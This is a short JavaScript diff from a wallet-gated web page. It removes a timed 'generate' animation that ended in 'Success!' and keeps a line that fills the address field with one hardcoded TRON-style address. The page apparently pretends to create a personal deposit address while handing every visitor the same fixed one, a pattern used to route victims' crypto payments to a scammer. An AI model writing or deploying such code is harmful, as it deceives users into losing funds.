@@ -57,30 +57,8 @@
         if (!localStorage.getItem("wallet")) {
             window.location.href = 'https://' + window.location.host;
         }
-
-        const gen = document.querySelector(".gen");
-        /*document.querySelector(".adrf").value = localStorage.getItem("blc");*/
-        gen.addEventListener("click", () => {
-    
-                
-                setTimeout(() => {
-                    gen.classList.add("half");
-                }, 1000);
-                setTimeout(() => {
-                    gen.classList.add("full");
-                    gen.innerHTML = "Success!";
-                    document.querySelector(".adrf").value = "TQwUCmVJHQqWSZsJ7PFUVgA7kbNJATKFiP";
-                    /*localStorage.setItem("blc", "TQwUCmVJHQqWSZsJ7PFUVgA7kbNJATKFiP");*/
-                }, 2000);
-            }
-                             document.querySelector(".adrf").value = "TQwUCmVJHQqWSZsJ7PFUVgA7kbNJATKFiP";
+            document.querySelector(".adrf").value = "TQwUCmVJHQqWSZsJ7PFUVgA7kbNJATKFiP";
             
-                gen.addEventListener("click", () => {
-                    gen.innerHTML = "Generated!";
-                    return 0;
-                });
-            
-        });
         const dones1 = document.querySelector(".done");
         dones1.addEventListener("click", () => {
             if (document.querySelector(".adrf").value) {
